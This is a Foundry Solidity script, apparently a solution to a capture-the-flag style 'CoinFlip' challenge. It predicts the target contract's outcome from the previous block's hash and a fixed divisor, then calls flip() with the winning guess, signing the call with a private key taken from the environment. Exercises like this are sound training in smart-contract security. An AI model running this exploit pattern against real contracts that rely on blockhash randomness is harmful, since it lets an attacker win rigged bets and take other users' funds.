// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console2.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool _guess) external returns (bool);
}

contract HackCoinFlip is Script {
    address target = vm.envAddress("COINFLIP_ADDRESS");
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        uint256 playerPK = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(playerPK);

        ICoinFlip coinFlip = ICoinFlip(target);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipValue = blockValue / FACTOR;
        bool guess = coinFlipValue == 1 ? true : false;

        bool result = coinFlip.flip(guess);

        console2.log("Guess: ", guess);
        console2.log("Result: ", result);
        console2.log("Consecutive Wins: ", coinFlip.consecutiveWins());

        vm.stopBroadcast();
    }
}
